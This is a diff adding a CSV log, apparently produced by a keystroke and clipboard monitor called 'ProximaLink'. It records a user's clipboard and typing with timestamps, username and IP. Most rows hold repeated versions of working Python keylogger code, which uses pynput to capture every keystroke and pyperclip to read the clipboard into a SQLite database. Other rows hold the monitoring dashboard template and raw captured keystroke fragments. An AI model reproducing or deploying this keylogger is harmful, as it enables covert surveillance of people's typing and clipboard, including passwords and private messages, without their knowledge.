@@ -1,0 +1,832 @@
+Timestamp,Username,IP,Data
+2024-07-02 09:04:42,Toshiba,192.168.100.200,"<!DOCTYPE html>
+<html lang=""en"">
+  <head>
+    <meta charset=""UTF-8"" />
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
+    <title>ProximaLink Dashboard</title>
+    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"" />
+    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"" />
+  </head>
+  <body>
+    <header class=""bg-primary text-white text-center py-3"">
+      <h1>ProximaLink Dashboard</h1>
+      <p>Welcome to the monitoring dashboard.</p>
+    </header>
+    <div class=""container-fluid"">
+      <div class=""row"">
+        <aside class=""col-md-2 bg-light py-3"">
+          <h2>Users</h2>
+          <ul class=""list-unstyled"">
+            {% if unique_users %}
+              {% for user in unique_users %}
+                <li class=""user-item"">{{ user }}</li>
+              {% endfor %}
+            {% else %}
+              <p>No users found yet.</p>
+            {% endif %}
+          </ul>
+        </aside>
+        <main class=""col-md-10 py-3"">
+          {% if user_logs %}
+            {% for user, logs in user_logs.items() %}
+              <section class=""user-section"">
+                <h2>{{ user[0] }}</h2>
+                <p>{{ user[1] }}</p>
+                <div class=""row row-data"">
+                  {% for log in logs %}
+                    <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                      <p>{{ log.text }}</p>
+                      <p class=""timestamp text-right"">{{ log.timestamp }}</p>
+                    </div>
+                  {% endfor %}
+                </div>
+              </section>
+            {% endfor %}
+          {% endif %}
+          {% if clipboard_logs %}
+            {% for user, logs in clipboard_logs.items() %}
+              <section class=""user-section"">
+                <h2>{{ user[0] }}</h2>
+                <p>{{ user[1] }}</p>
+                <div class=""row row-data"">
+                  {% for log in logs %}
+                    <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
+                      <p>{{ log.text }}</p>
+                      <p class=""timestamp text-right"">{{ log.timestamp }}</p>
+                    </div>
+                  {% endfor %}
+                </div>
+              </section>
+            {% endfor %}
+          {% else %}
+            <div class=""alert alert-info text-center"" role=""alert"">
+              No logs found yet. Monitor activity for data to appear.
+            </div>
+          {% endif %}
+        </main>
+      </div>
+    </div>
+    <footer class=""bg-primary text-white text-center py-3 mt-3"">
+      <p>ProximaLink Monitoring &copy; 2024</p>
+    </footer>
+    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
+    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
+    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
+  </body>
+</html>
+"
+2024-07-02 09:05:03,Toshiba,192.168.100.200,Clipboard
+2024-07-02 09:05:46,Toshiba,192.168.100.200,"Toshiba
+192.168.100.200
+
+Keystroke: Key.f5
+
+2024-07-02 09:05:36
+
+Keystroke: Key.f5
+
+2024-07-02 09:05:29
+
+Keystroke: Key.enter
+
+2024-07-02 09:05:23
+
+Keystroke: i
+
+2024-07-02 09:05:22
+
+Keystroke: n
+
+2024-07-02 09:05:22
+
+Keystroke: g
+
+2024-07-02 09:05:22
+
+Keystroke: Key.space
+
+2024-07-02 09:05:22
+
+Keystroke: o
+
+2024-07-02 09:05:22
+
+Keystroke: k
+
+2024-07-02 09:05:22
+
+Keystroke: '
+
+2024-07-02 09:05:21
+
+Keystroke: s
+
+2024-07-02 09:05:21
+
+Keystroke: Key.space
+
+2024-07-02 09:05:21
+
+Keystroke: w
+
+2024-07-02 09:05:21
+
+Keystroke: o
+
+2024-07-02 09:05:21
+
+Keystroke: r
+
+2024-07-02 09:05:21
+
+Keystroke: k
+
+2024-07-02 09:05:21
+
+Keystroke: f"
+2024-07-02 09:08:45,Toshiba,192.168.100.200,"try:
+        if hasattr(key, 'char') and key.char is not None:
+            sentence_buffer.append(key.char)
+        else:
+            if key in special_keys:
+                if key == keyboard.Key.enter:
+                    sentence_buffer.append(special_keys[key])
+                    log_sentence(''.join(sentence_buffer))
+                    sentence_buffer = []
+                elif key == keyboard.Key.space:
+                    sentence_buffer.append(' ')
+                else:
+                    sentence_buffer.append(special_keys[key])
+            else:
+                sentence_buffer.append(f""[{key}]"")
+
+        # If the buffer is too large, log it as a sentence
+        if len(sentence_buffer) > 50:
+            log_sentence(''.join(sentence_buffer))
+            sentence_buffer = []"
+2024-07-02 09:11:58,Toshiba,192.168.100.200,"try:
+        if hasattr(key, 'char') and key.char is not None:
+            sentence_buffer.append(key.char)
+        else:
+            if key in special_keys:
+                if key == keyboard.Key.enter:
+                    sentence_buffer.append(special_keys[key])
+                    log_sentence(''.join(sentence_buffer))
+                    sentence_buffer = []
+                elif key == keyboard.Key.space:
+                    sentence_buffer.append(' ')
+                else:
+                    sentence_buffer.append(special_keys[key])
+            else:
+                sentence_buffer.append(f""[{key}]"")
+
+        # If the buffer is too large, log it as a sentence
+        if len(sentence_buffer) > 50:
+            log_sentence(''.join(sentence_buffer))
+            sentence_buffer = []"
+2024-07-02 09:12:20,Toshiba,192.168.100.200,pressed_keys
+2024-07-02 09:13:27,Toshiba,192.168.100.200,pressed_keys
+2024-07-02 09:15:25,Toshiba,192.168.100.200,pressed_keys
+2024-07-02 09:16:28,Toshiba,192.168.100.200,"Toshiba
+192.168.100.200
+
+Keystroke: in
+
+2024-07-02 09:16:18
+
+Keystroke: king aga
+
+2024-07-02 09:16:15
+
+Keystroke: not wor
+
+2024-07-02 09:16:14
+
+Keystroke:"
+2024-07-02 09:16:58,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l: ""Ctrl"",
+    keyboard.Key.ctrl_r: ""Ctrl"",
+    keyboard.Key.shift: ""Shift"",
+    keyboard.Key.shift_r: ""Shift"",
+    keyboard.Key.alt: ""Alt"",
+    keyboard.Key.alt_gr: ""AltGr"",
+    keyboard.Key.tab: ""Tab"",
+    keyboard.Key.caps_lock: ""CapsLock"",
+    keyboard.Key.delete: ""Delete"",
+    keyboard.Key.esc: ""Esc"",
+    keyboard.Key.up: ""Up"",
+    keyboard.Key.down: ""Down"",
+    keyboard.Key.left: ""Left"",
+    keyboard.Key.right: ""Right"",
+}
+
+pressed_keys = set()
+is_modifier_active = False
+
+
+def on_release(key):
+    global pressed_keys, is_modifier_active, buffer, last_time
+    if key in modifier_keys.keys():
+        pressed_keys.discard(key)
+        is_modifier_active = any(k in modifier_keys for k in pressed_keys)
+
+    # Capture keystrokes
+    try:
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key == keyboard.Key.enter:
+            buffer.append(""\n"")
+        elif key == keyboard.Key.space:
+            buffer.append("" "")
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+            log_sentence("""".join(buffer))
+            buffer = []
+
+        # If the buffer is too large, log it as a sentence
+        if len(buffer) > 4:
+
+            current_time = time.time()
+            if current_time - last_time > 1:
+                log_sentence("""".join(buffer))
+                buffer = []
+                last_time = current_time
+                print("""".join(buffer))
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    # Capture clipboard changes
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+    print(""Listening..."")
+"
+2024-07-02 09:19:36,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l: ""Ctrl"",
+    keyboard.Key.ctrl_r: ""Ctrl"",
+    keyboard.Key.shift: ""Shift"",
+    keyboard.Key.shift_r: ""Shift"",
+    keyboard.Key.alt: ""Alt"",
+    keyboard.Key.alt_gr: ""AltGr"",
+    keyboard.Key.tab: ""Tab"",
+    keyboard.Key.caps_lock: ""CapsLock"",
+    keyboard.Key.delete: ""Delete"",
+    keyboard.Key.esc: ""Esc"",
+    keyboard.Key.up: ""Up"",
+    keyboard.Key.down: ""Down"",
+    keyboard.Key.left: ""Left"",
+    keyboard.Key.right: ""Right"",
+}
+
+special_keys = {
+    keyboard.Key.enter: ""\n"",
+    keyboard.Key.space: "" "",
+    keyboard.Key.tab: ""\t"",
+    keyboard.Key.backspace: ""[BACKSPACE]""
+}
+
+def on_release(key):
+    global buffer, last_time
+    try:
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key in special_keys:
+            buffer.append(special_keys[key])
+            if key == keyboard.Key.enter:
+                log_sentence("""".join(buffer))
+                buffer = []
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+        else:
+            buffer.append(f""[{key}]"")
+
+        current_time = time.time()
+        if current_time - last_time > 1:
+            log_sentence("""".join(buffer))
+            buffer = []
+            last_time = current_time
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+"
+2024-07-02 09:22:01,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l: ""Ctrl"",
+    keyboard.Key.ctrl_r: ""Ctrl"",
+    keyboard.Key.shift: ""Shift"",
+    keyboard.Key.shift_r: ""Shift"",
+    keyboard.Key.alt: ""Alt"",
+    keyboard.Key.alt_gr: ""AltGr"",
+    keyboard.Key.tab: ""Tab"",
+    keyboard.Key.caps_lock: ""CapsLock"",
+    keyboard.Key.delete: ""Delete"",
+    keyboard.Key.esc: ""Esc"",
+    keyboard.Key.up: ""Up"",
+    keyboard.Key.down: ""Down"",
+    keyboard.Key.left: ""Left"",
+    keyboard.Key.right: ""Right"",
+}
+
+special_keys = {
+    keyboard.Key.enter: ""\n"",
+    keyboard.Key.space: "" "",
+    keyboard.Key.tab: ""\t"",
+    keyboard.Key.backspace: ""[BACKSPACE]""
+}
+
+def on_release(key):
+    global buffer, last_time
+    try:
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key in special_keys:
+            buffer.append(special_keys[key])
+            if key == keyboard.Key.enter:
+                log_sentence("""".join(buffer))
+                buffer = []
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+        else:
+            buffer.append(f""[{key}]"")
+
+        current_time = time.time()
+        if current_time - last_time > 1:
+            log_sentence("""".join(buffer))
+            buffer = []
+            last_time = current_time
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+"
+2024-07-02 09:24:23,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l: ""Ctrl"",
+    keyboard.Key.ctrl_r: ""Ctrl"",
+    keyboard.Key.shift: ""Shift"",
+    keyboard.Key.shift_r: ""Shift"",
+    keyboard.Key.alt: ""Alt"",
+    keyboard.Key.alt_gr: ""AltGr"",
+    keyboard.Key.tab: ""Tab"",
+    keyboard.Key.caps_lock: ""CapsLock"",
+    keyboard.Key.delete: ""Delete"",
+    keyboard.Key.esc: ""Esc"",
+    keyboard.Key.up: ""Up"",
+    keyboard.Key.down: ""Down"",
+    keyboard.Key.left: ""Left"",
+    keyboard.Key.right: ""Right"",
+}
+
+
+def on_release(key):
+    global buffer, last_time
+    try:
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key == keyboard.Key.enter:
+            buffer.append(""\n"")
+            log_sentence("""".join(buffer))
+            buffer = []
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+        elif key == keyboard.Key.space:
+            buffer.append("" "")
+            log_sentence("""".join(buffer))
+            buffer = []
+        elif key in modifier_keys:
+            modifier = modifier_keys[key]
+            buffer.append(f""[{modifier}]"")
+
+        current_time = time.time()
+        if current_time - last_time > 1:
+            log_sentence("""".join(buffer))
+            buffer = []
+            last_time = current_time
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+"
+2024-07-02 09:27:49,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
+    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
+    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
+    keyboard.Key.left, keyboard.Key.right
+}
+
+def log_buffer():
+    global buffer
+    if buffer:
+        log_sentence("""".join(buffer))
+        buffer = []
+
+def on_release(key):
+    global buffer, last_time
+    try:
+        if key in modifier_keys:
+            return  # Do not log modifier keys
+
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key == keyboard.Key.enter:
+            log_buffer()
+        elif key == keyboard.Key.space:
+            buffer.append("" "")
+            log_buffer()
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+
+        # Log the buffer if a second has passed since the last keystroke
+        current_time = time.time()
+        if current_time - last_time > 1:
+            log_buffer()
+            last_time = current_time
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+"
+2024-07-02 09:27:56,Toshiba,192.168.100.200,"import time
+from datetime import datetime
+from pynput import keyboard
+import sqlite3
+import pyperclip
+from logData.logger import log_clipboard, log_sentence
+
+# Database setup
+DB_FILE = ""keylogs.db""
+
+def create_database():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    c.execute(
+        """"""
+        CREATE TABLE IF NOT EXISTS clipboard_logs (
+            timestamp TEXT,
+            username TEXT,
+            ip TEXT,
+            text TEXT
+        )
+        """"""
+    )
+    conn.commit()
+    conn.close()
+
+# Ensure database is created before any operations
+create_database()
+
+buffer = []
+last_time = time.time()
+modifier_keys = {
+    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
+    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
+    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
+    keyboard.Key.left, keyboard.Key.right
+}
+
+def log_buffer():
+    global buffer
+    if buffer:
+        log_sentence("""".join(buffer))
+        buffer = []
+
+def on_release(key):
+    global buffer, last_time
+    try:
+        if key in modifier_keys:
+            return  # Do not log modifier keys
+
+        if hasattr(key, ""char"") and key.char is not None:
+            buffer.append(key.char)
+        elif key == keyboard.Key.enter:
+            log_buffer()
+        elif key == keyboard.Key.space:
+            buffer.append("" "")
+            log_buffer()
+        elif key == keyboard.Key.backspace:
+            if buffer:
+                buffer.pop()
+
+        # Log the buffer if a second has passed since the last keystroke
+        current_time = time.time()
+        if current_time - last_time > 1:
+            log_buffer()
+            last_time = current_time
+    except Exception as e:
+        print(f""Error logging keystroke: {e}"")
+
+    try:
+        clipboard_text = pyperclip.paste()
+        if clipboard_text:
+            log_clipboard(clipboard_text)
+    except pyperclip.PyperclipException as e:
+        print(f""Error capturing clipboard: {e}"")
+
+# Start listening to keyboard events
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
+"
+2024-07-02 09:28:06,Toshiba,192.168.100.200,"Keystroke logged: this
+Keystroke logged: is
+Keystroke logged: not
+Keystroke logged: g
+Keystroke logged: ood
+Keystroke logged: ata
+Keystroke logged: all"
+2024-07-02 09:28:18,Toshiba,192.168.100.200,"Toshiba
+192.168.100.200
+
+Keystroke: v
+
+2024-07-02 09:28:06
+
+Keystroke: all
+
+2024-07-02 09:28:00
+
+Keystroke: ood
+
+2024-07-02 09:27:59
+
+Keystroke: ata
+
+2024-07-02 09:27:59
+
+Keystroke: not
+
+2024-07-02 09:27:58
+
+Keystroke: g
+
+2024-07-02 09:27:58
+
+Keystroke: this"
